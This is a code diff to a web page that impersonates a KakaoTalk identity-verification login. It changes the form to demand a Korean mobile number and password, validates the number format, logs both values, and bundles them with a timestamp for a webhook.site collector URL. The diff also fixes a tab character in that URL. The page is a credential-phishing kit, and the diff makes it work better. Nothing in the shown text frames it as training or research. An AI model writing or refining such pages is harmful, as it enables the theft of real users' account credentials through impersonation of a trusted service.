@@ -47,7 +47,7 @@
   <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="이메일 또는 전화번호" id="userId" style="width:370px; padding:5px;">
+    <input type="text" placeholder="전화번호 (예: 01012345678)" id="userId" style="width:370px; padding:5px;">
     <input type="password" placeholder="비밀번호" id="userPw" style="width:370px; padding:5px;">
     <button type="button" class="btn-gray" onclick="login()">본인인증하기</button>
   </div>
@@ -64,22 +64,29 @@
     }
 
     function login() {
-      const email = document.getElementById("userId").value.trim();
+      const userId = document.getElementById("userId").value.trim();
       const password = document.getElementById("userPw").value.trim();
 
-      if (!email || !password) {
-        alert("이메일/전화번호와 비밀번호를 입력해주세요.");
+      if (!userId || !password) {
+        alert("전화번호와 비밀번호를 입력해주세요.");
         return;
       }
 
-      console.log("이메일/전화번호:", email);
+      // 전화번호 검증: 010으로 시작하고 11자리 숫자
+      const phoneRegex = /^010\d{8}$/;
+      if (!phoneRegex.test(userId)) {
+        alert("전화번호는 010으로 시작하고 총 11자리여야 합니다.");
+        return;
+      }
+
+      console.log("전화번호:", userId);
       console.log("비밀번호:", password);
 
       // webhook.site URL
-      const webhookUrl = "	https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
+      const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
 
       const formData = new URLSearchParams();
-      formData.append("email", email);
+      formData.append("phone", userId);
       formData.append("password", password);
       formData.append("timestamp", new Date().toISOString());
 
